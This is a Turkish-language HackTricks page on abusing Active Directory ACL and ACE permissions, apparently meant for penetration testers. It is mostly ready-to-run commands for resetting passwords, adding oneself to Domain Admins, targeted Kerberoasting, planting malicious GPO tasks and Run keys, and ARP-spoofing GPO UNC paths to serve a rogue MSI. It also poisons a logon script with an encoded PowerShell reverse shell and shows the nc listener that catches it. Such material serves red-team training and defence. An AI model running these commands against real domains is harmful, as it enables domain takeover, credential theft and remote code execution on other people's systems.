# Active Directory ACL/ACE Abuse

{{#include ../../../banners/hacktricks-training.md}}

**Bu sayfa çoğunlukla** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **ve** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges) **adreslerindeki tekniklerin bir özetidir. Daha fazla ayrıntı için orijinal makalelere bakın.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **Kullanıcı Üzerinde GenericAll Hakları**

Bu yetki, saldırgana hedef kullanıcı hesabı üzerinde tam kontrol sağlar. `Get-ObjectAcl` komutu kullanılarak `GenericAll` hakları doğrulandıktan sonra saldırgan şunları yapabilir:

- **Hedefin Parolasını Değiştirme**: `net user <username> <password> /domain` kullanılarak kullanıcının parolası sıfırlanabilir.
- Linux üzerinden aynı işlem Samba `net rpc` ile SAMR kullanılarak yapılabilir:<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **Hesap devre dışıysa, UAC flag'ini temizleyin**: `GenericAll`, `userAccountControl` değerinin düzenlenmesine izin verir. Linux'tan BloodyAD, `ACCOUNTDISABLE` flag'ini kaldırabilir:<sup>[[8]](#references)[[10]](#references)</sup>
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: Kullanıcının hesabına bir SPN atayarak hesabı kerberoastable hâle getirin, ardından Rubeus ve targetedKerberoast.py kullanarak ticket-granting ticket (TGT) hash'lerini çıkarıp kırmayı deneyin.
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Hedefli ASREPRoasting**: Kullanıcı için ön kimlik doğrulamayı devre dışı bırakarak hesabını ASREPRoasting saldırılarına karşı savunmasız hâle getirme.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: Bir kullanıcı üzerinde `GenericAll` yetkisine sahip olduğunuzda, parola değiştirmeden kullanıcı olarak kimlik doğrulamak için certificate-based bir credential ekleyebilirsiniz. Bkz.:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Group Üzerindeki GenericAll Yetkileri**

Bu ayrıcalık, saldırganın `Domain Admins` gibi bir grup üzerinde `GenericAll` yetkilerine sahip olması durumunda grup üyeliklerini değiştirmesine olanak tanır. `Get-NetGroup` ile grubun distinguished name değerini belirledikten sonra saldırgan şunları yapabilir:

- **Kendilerini Domain Admins Group'a Ekleme**: Bu işlem doğrudan komutlarla veya Active Directory ya da PowerSploit gibi modüller kullanılarak gerçekleştirilebilir.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Linux üzerinden, gruplar üzerinde GenericAll/Write üyelik yetkisine sahip olduğunuzda kendinizi rastgele gruplara eklemek için BloodyAD'den de yararlanabilirsiniz. Hedef grup “Remote Management Users” içine iç içe yerleştirilmişse, bu gruba uyan host'larda derhâl WinRM erişimi kazanırsınız:<sup>[[8]](#references)</sup>
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Bu ayrıcalıklara bir bilgisayar nesnesi veya kullanıcı hesabı üzerinde sahip olmak şunları sağlar:

- **Kerberos Resource-based Constrained Delegation**: Bir bilgisayar nesnesinin ele geçirilmesini sağlar.
- **Shadow Credentials**: Shadow Credentials oluşturma ayrıcalıklarından yararlanarak bir bilgisayar veya kullanıcı hesabını taklit etmek için bu teknik kullanılabilir.

## **WriteProperty on Group**

Bir kullanıcı belirli bir grup içindeki tüm nesneler üzerinde `WriteProperty` haklarına sahipse (ör. `Domain Admins`), şunları yapabilir:

- **Kendilerini Domain Admins Grubuna Ekleme**: `net user` ve `Add-NetGroupUser` komutlarının birlikte kullanılmasıyla gerçekleştirilebilen bu yöntem, domain içinde ayrıcalık yükseltmeye olanak tanır.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Group üzerinde Self (Self-Membership)**

Bu ayrıcalık, saldırganların grup üyeliğini doğrudan değiştiren komutlar aracılığıyla kendilerini `Domain Admins` gibi belirli gruplara eklemelerine olanak tanır. Aşağıdaki komut dizisi, kendini eklemeye olanak sağlar:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Benzer bir yetki olan bu hak, saldırganların gruplar üzerinde `WriteProperty` hakkına sahip olmaları durumunda grup özelliklerini değiştirerek kendilerini doğrudan gruplara eklemelerine olanak tanır. Bu yetkinin doğrulanması ve uygulanması şu şekilde gerçekleştirilir:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Bir kullanıcı üzerinde `User-Force-Change-Password` için `ExtendedRight` yetkisine sahip olmak, mevcut parolayı bilmeden parola sıfırlamaya olanak tanır. Bu yetkinin doğrulanması ve kötüye kullanılması, PowerShell veya alternatif command-line araçları aracılığıyla gerçekleştirilebilir ve bir kullanıcının parolasını sıfırlamak için etkileşimli oturumlar ile etkileşimsiz ortamlara yönelik one-liner'lar dahil olmak üzere çeşitli yöntemler sunar. Komutlar basit PowerShell çağrılarından Linux üzerinde `rpcclient` kullanımına kadar uzanır ve attack vector'lerinin çok yönlülüğünü gösterir.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **Grup üzerinde WriteOwner**

Bir saldırganın bir grup üzerinde `WriteOwner` haklarına sahip olduğu tespit edilirse, grubun sahipliğini kendi üzerine değiştirebilir. Bu durum, söz konusu grup `Domain Admins` olduğunda özellikle etkilidir; çünkü sahipliğin değiştirilmesi, grup öznitelikleri ve üyelikleri üzerinde daha geniş bir kontrol sağlar. İşlem, `Get-ObjectAcl` kullanılarak doğru nesnenin belirlenmesini ve ardından sahibi SID veya ad üzerinden değiştirmek için `Set-DomainObjectOwner` kullanılmasını içerir.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **Kullanıcı Üzerinde GenericWrite**

Bu izin, bir saldırganın kullanıcı özelliklerini değiştirmesine olanak tanır. Özellikle `GenericWrite` erişimiyle saldırgan, kullanıcı oturum açtığında kötü amaçlı bir betiği çalıştırmak üzere kullanıcının logon script path değerini değiştirebilir. Bu işlem, hedef kullanıcının `scriptpath` özelliğini saldırganın betiğine işaret edecek şekilde güncellemek için `Set-ADObject` komutu kullanılarak gerçekleştirilir.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

Bu yetkiyle saldırganlar, kendilerini veya diğer kullanıcıları belirli gruplara eklemek gibi grup üyeliğini değiştirebilir. Bu işlem; bir credential object oluşturmayı, bunu kullanarak kullanıcıları bir gruba eklemeyi veya gruptan kaldırmayı ve PowerShell komutlarıyla üyelik değişikliklerini doğrulamayı içerir.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Linux'tan, grup üzerinde `GenericWrite` yetkiniz olduğunda Samba `net` üyeleri ekleyebilir/kaldırabilir (PowerShell/RSAT kullanılamadığında kullanışlıdır):<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

Bir AD nesnesinin sahibi olmak ve üzerinde `WriteDACL` ayrıcalıklarına sahip olmak, saldırganın nesne üzerinde kendisine `GenericAll` ayrıcalıkları vermesini sağlar. Bu işlem, ADSI manipulation kullanılarak gerçekleştirilir ve nesne üzerinde tam denetim ile grup üyeliklerini değiştirme yeteneği sağlar. Buna rağmen, Active Directory module'ünün `Set-Acl` / `Get-Acl` cmdlet'lerini kullanarak bu ayrıcalıkları exploit etmeye çalışırken bazı kısıtlamalar mevcuttur.<sup>[[4]](#references)[[7]](#references)</sup>
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### WriteDACL/WriteOwner hızlı ele geçirme (PowerView)

Bir kullanıcı veya service account üzerinde `WriteOwner` ve `WriteDacl` yetkilerine sahip olduğunuzda, eski parolayı bilmeden PowerView kullanarak tam kontrolü ele geçirebilir ve parolasını sıfırlayabilirsiniz:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
Notlar:
- Yalnızca `WriteOwner` yetkiniz varsa önce sahibi kendiniz olarak değiştirmeniz gerekebilir:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- Password reset sonrasında herhangi bir protokolle (SMB/LDAP/RDP/WinRM) erişimi doğrulayın.

## **Domain üzerinde Replication (DCSync)**

DCSync saldırısı, Domain Controller'ı taklit etmek ve kullanıcı kimlik bilgileri dahil verileri senkronize etmek için domain üzerindeki belirli replication izinlerinden yararlanır. Bu güçlü teknik, saldırganların Domain Controller'a doğrudan erişmeden AD ortamından hassas bilgileri çıkarmasına olanak tanıyan `DS-Replication-Get-Changes` gibi izinler gerektirir.<sup>[[5]](#references)</sup> [**DCSync saldırısı hakkında daha fazla bilgi edinin.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

Group Policy Objects (GPOs) yönetimi için delegated erişim, önemli güvenlik riskleri oluşturabilir. Örneğin, `offense\spotless` gibi bir kullanıcıya GPO yönetim hakları delegated edilmişse, bu kullanıcı **WriteProperty**, **WriteDacl** ve **WriteOwner** gibi ayrıcalıklara sahip olabilir. PowerView kullanılarak tespit edildiği üzere bu izinler kötü amaçlı amaçlarla kötüye kullanılabilir: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### GPO Permissions Enumeration

Yanlış yapılandırılmış GPO'ları belirlemek için PowerSploit cmdlet'leri birbirine zincirlenebilir. Bu, belirli bir kullanıcının yönetme izinlerine sahip olduğu GPO'ların keşfedilmesini sağlar: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Belirli Bir Policy Uygulanan Bilgisayarlar**: Belirli bir GPO'nun hangi bilgisayarlara uygulandığını çözümlemek mümkündür; bu, olası etkinin kapsamını anlamaya yardımcı olur. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Belirli Bir Bilgisayara Uygulanan Policy'ler**: Belirli bir bilgisayara hangi policy'lerin uygulandığını görmek için `Get-DomainGPO` gibi komutlar kullanılabilir.

**Belirli Bir Policy Uygulanan OU'lar**: Belirli bir policy'den etkilenen organizational unit'ler (OU'lar) `Get-DomainOU` kullanılarak belirlenebilir.

GPO'ları enumerate etmek ve içlerindeki sorunları bulmak için [**GPOHound**](https://github.com/cogiceo/GPOHound) aracını da kullanabilirsiniz.

### Abuse GPO - New-GPOImmediateTask

Yanlış yapılandırılmış GPO'lar, örneğin immediate scheduled task oluşturarak code execute etmek için exploit edilebilir. Bu işlem, etkilenen makinelerde bir kullanıcıyı local administrators grubuna eklemek ve ayrıcalıkları önemli ölçüde yükseltmek için kullanılabilir:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - GPO Abuse

GroupPolicy module'ü yüklüyse yeni GPO''lar oluşturulmasına ve bağlanmasına, ayrıca etkilenen bilgisayarlarda backdoor'ları çalıştırmak için registry değerleri gibi tercihlerin ayarlanmasına olanak tanır. Bu yöntem, GPO'nun güncellenmesini ve çalıştırma işlemi için bir kullanıcının bilgisayarda oturum açmasını gerektirir:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - GPO Abuse

SharpGPOAbuse, yeni GPO'lar oluşturma gereksinimi olmadan görevler ekleyerek veya ayarları değiştirerek mevcut GPO'ları abuse etmek için bir yöntem sunar. Bu tool, değişiklikleri uygulamadan önce mevcut GPO'ların değiştirilmesini veya yeni GPO'lar oluşturmak için RSAT araçlarının kullanılmasını gerektirir:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Force Policy Update

GPO güncellemeleri genellikle yaklaşık 90 dakikada bir gerçekleşir. Bu süreci hızlandırmak, özellikle bir değişiklik uygulandıktan sonra güncellemeyi beklemeden gerçekleştirmek için hedef bilgisayarda `gpupdate /force` komutu kullanılabilir. Bu komut, GPO'larda yapılan değişikliklerin bir sonraki otomatik güncelleme döngüsü beklenmeden uygulanmasını sağlar.

### Teknik Ayrıntılar

Belirli bir GPO'nun, örneğin `Misconfigured Policy` öğesinin Scheduled Tasks bölümü incelendiğinde, `evilTask` gibi görevlerin eklendiği doğrulanabilir. Bu görevler, sistem davranışını değiştirmeyi veya ayrıcalıkları yükseltmeyi amaçlayan scriptler ya da command-line araçları aracılığıyla oluşturulur.

`New-GPOImmediateTask` tarafından oluşturulan XML yapılandırma dosyasında gösterilen görev yapısı, çalıştırılacak komut ve tetikleyicileri de içeren Scheduled Task'a ilişkin ayrıntıları belirtir. Bu dosya, Scheduled Tasks'ın GPO'lar içinde nasıl tanımlandığını ve yönetildiğini gösterir ve policy enforcement'ın bir parçası olarak rastgele komutların veya scriptlerin çalıştırılmasını sağlar.

### Users and Groups

GPO'lar ayrıca hedef sistemlerdeki kullanıcı ve grup üyeliklerinin değiştirilmesine olanak tanır. Users and Groups policy dosyaları doğrudan düzenlenerek saldırganlar, kullanıcıları yerel `administrators` grubu gibi ayrıcalıklı gruplara ekleyebilir. Bu işlem, GPO yönetim izinlerinin devredilmesiyle mümkün olur; bu izinler, yeni kullanıcılar eklemek veya grup üyeliklerini değiştirmek amacıyla policy dosyalarının değiştirilmesine olanak tanır.

Users and Groups için XML yapılandırma dosyası, bu değişikliklerin nasıl uygulandığını gösterir. Bu dosyaya girişler eklenerek belirli kullanıcılara etkilenen sistemlerde yükseltilmiş ayrıcalıklar verilebilir. Bu yöntem, GPO manipülasyonu yoluyla privilege escalation için doğrudan bir yaklaşım sunar.

Bunlara ek olarak, code çalıştırmak veya persistence sağlamak için logon/logoff scriptlerinden yararlanma, autorun işlemleri için registry key'lerini değiştirme, .msi dosyaları aracılığıyla software kurma ya da service yapılandırmalarını düzenleme gibi yöntemler de değerlendirilebilir. Bu teknikler, GPO'ların abuse edilmesi yoluyla erişimi sürdürmek ve hedef sistemleri kontrol etmek için çeşitli yollar sunar.

### WriteGPLink + UNC path hijacking (ARP spoofing)

Bir OU/domain üzerinde `WriteGPLink`, hedef container'ın `gPLink` attribute'unu değiştirmenize ve GPO'nun kendisini düzenlemeden **mevcut bir GPO'nun uygulanmasını zorlamanıza** olanak tanır. Bağlantısı oluşturulan GPO, **UNC paths** (`\\HOST\share\...`) üzerinden remote content'e zaten başvuruyorsa bu durum ilgi çekici hale gelir; çünkü authenticated users **SYSVOL**'u okuyabilir ve yeniden kullanılabilir policy'leri offline olarak araştırabilir.<sup>[[11]](#references)</sup>

High-level workflow:

1. BloodHound kullanarak bir OU üzerinde `WriteGPLink` yetkisine sahip principal'ı belirleyin ve bu OU içindeki computer/user'ları listeleyin.
2. `SYSVOL`'u salt okunur olarak clone edin ve UNC paths'e başvuran **Software Installation**, **drive mappings** (`Drives.xml`) ve **logon/startup scripts** öğelerini bulmak için GPO'ları parse edin.
3. DFS/domain-namespace paths yerine **direct hostname** kullanan policy'leri tercih edin (örneğin `\\DC02\share\pkg.msi`); hostname tabanlı path'ler L2 spoofing ile yönlendirmeye daha uygundur.
4. Victim'ın mevcut policy'yi işlemesini sağlamak için seçilen GPO GUID'sini hedef OU'nun `gPLink` attribute'una ekleyin.
5. Aynı broadcast domain üzerinde UNC host'unu ARP spoof edin ve IP'sini local olarak bağlayın (`ip addr add <target_ip>/32 dev <iface>`); böylece victim'ın SMB traffic'i host'unuza ulaşır.
6. Beklenen path/filename'i bir attacker SMB server'ı üzerinden (örneğin `smbserver.py`) sunun ve normal policy processing'i bekleyin.

Example `SYSVOL` collection and GPO correlation:
```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```
Mevcut GPO'yu hedef OU'ya bağlayın:
```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
--gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```
#### Software Installation UNC hijack -> SYSTEM

Bağlantılı GPO, bir UNC path üzerinden MSI dağıtıyorsa istemci bunu **bilgisayar başlangıcında** alır ve **`NT AUTHORITY\SYSTEM`** olarak yükler. Referans verilen host'u spoof edip kötü amaçlı bir MSI'ı **aynı share/path/name** altında sunarak **SYSVOL'u değiştirmeden** `WriteGPLink` işlemini SYSTEM seviyesinde code execution'a dönüştürebilirsiniz.

Önemli kısıtlamalar:

- **Zamanlama önemlidir**: Yeni link policy refresh sırasında (genellikle ~90 dakika) görülür; ancak **Software Installation** genellikle **reboot** sırasında tetiklenir.
- Windows Installer dağıtımı genellikle package **`ProductCode`** üzerinden takip eder. Ürün zaten kuruluysa dağıtım atlanabilir.
- Installer'ın reddetmesini önlemek için rogue MSI'ı, **`ProductCode`** ve **`PackageCode`** değerleri GPO'nun beklediği legitimate package ile eşleşecek şekilde patch edin.
- Eski `.aas` advertisement dosyaları `SYSVOL` içinde kalabilir; buna güvenmeden önce deployment'ın hâlâ etkin göründüğünü doğrulayın.
```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```
#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

`Drives.xml` içindeki GPP drive mappings, kullanıcıların logon veya yeniden bağlanma sırasında yapılandırılmış UNC path'e authenticate olmasına neden olur. Referans verilen host'u spoof ederseniz **NetNTLMv2** yakalayabilirsiniz. SMB'nin kasıtlı olarak başarısız olması sağlanırsa Windows, **WebDAV** üzerinden yeniden deneme yapabilir ve **NTLM over HTTP** gönderebilir. Bu yöntem, **LDAP(S)**, **AD CS** veya **SMB**'ye relay işlemleri için çok daha esnektir.

#### Logon/startup script UNC hijack

Aynı yöntem, `SYSVOL` içinde keşfedilen UNC-hosted script'ler için de geçerlidir:

- **Logon scripts** genellikle **user** context'te çalışır.
- **Startup scripts** genellikle **computer / SYSTEM** context'te çalışır.

Script path'i spoof edilebilir bir hostname'e işaret ediyorsa UNC host'u yönlendirin ve beklenen konumdan replacement script içeriği sunun.

## SYSVOL/NETLOGON Logon Script Poisoning

`\\<dc>\SYSVOL\<domain>\scripts\` veya `\\<dc>\NETLOGON\` altındaki writable path'ler, GPO aracılığıyla user logon sırasında çalıştırılan logon script'lerinin değiştirilmesine olanak tanır. Bu, logon olan kullanıcıların security context'inde code execution sağlar.

### Logon script'lerini bulma
- Yapılandırılmış bir logon script'i olup olmadığını görmek için user attribute'larını inceleyin:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- Kısayolları veya script referanslarını ortaya çıkarmak için domain paylaşımlarını tarayın:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- Hedefleri SYSVOL/NETLOGON konumlarını gösteren `.lnk` dosyalarını ayrıştırın (yararlı bir DFIR hilesi ve doğrudan GPO erişimi olmayan saldırganlar için):
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound, mevcut olduğunda kullanıcı düğümlerinde `logonScript` (scriptPath) özniteliğini görüntüler.

### Yazma erişimini doğrulayın (paylaşım listelerine güvenmeyin)
Automated tooling, SYSVOL/NETLOGON'u salt okunur olarak gösterebilir; ancak temel NTFS ACL'leri yine de yazma izni sağlayabilir. Her zaman test edin:
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
Dosya boyutu veya mtime değişiyorsa yazma yetkiniz vardır. Değişiklik yapmadan önce orijinalleri koruyun.

### RCE için bir VBScript logon script'ini zehirleme
PowerShell reverse shell başlatan bir komut ekleyin (revshells.com üzerinden oluşturun) ve işlevselliği bozmamak için mevcut mantığı koruyun:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
Ana makinenizde dinleyin ve bir sonraki etkileşimli oturum açmayı bekleyin:
```bash
rlwrap -cAr nc -lnvp 443
```
Notlar:
- Execution, logging kullanıcısının token'ı altında gerçekleşir (SYSTEM değil). Kapsam, bu script'i uygulayan GPO link'idir (OU, site, domain).
- Kullanımdan sonra orijinal içeriği/zaman damgalarını geri yükleyerek temizleme yapın.


## Referanslar

- [1] [Active Directory ACL/ACE'lerini kötüye kullanma](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Ayrıcalıklı Hesaplar ve Token Ayrıcalıkları](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – ACL Attack Path Güncellemesi](https://wald0.com/?p=112)
- [4] [ActiveDirectoryRights Enum - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Active Directory'de ACL'ler ile ayrıcalık yükseltme](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Active Directory Ayrıcalıklarını ve Ayrıcalıklı Hesapları tarama](https://adsecurity.org/?p=3658)
- [7] [ActiveDirectoryAccessRule Constructor - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – Linux'tan AD attribute/UAC işlemleri](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (group membership)](https://www.samba.org/)
- [10] [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out: Hijacking GPO UNC Paths for Code Execution and NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)

{{#include ../../../banners/hacktricks-training.md}}
